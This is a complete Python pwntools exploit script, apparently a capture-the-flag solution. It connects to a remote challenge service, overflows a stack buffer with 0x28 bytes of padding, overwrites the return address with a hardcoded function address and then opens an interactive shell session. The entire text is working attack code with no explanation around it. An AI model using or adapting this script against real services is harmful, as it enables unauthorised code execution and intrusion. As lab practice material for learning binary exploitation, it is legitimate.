from pwn import*
n = remote('seclabs.cn',5116)

e = 0x04006b6
n.recvuntil(':')
payload = 'a'*0x28+p64(e)
n.sendline(payload)
n.interactive()
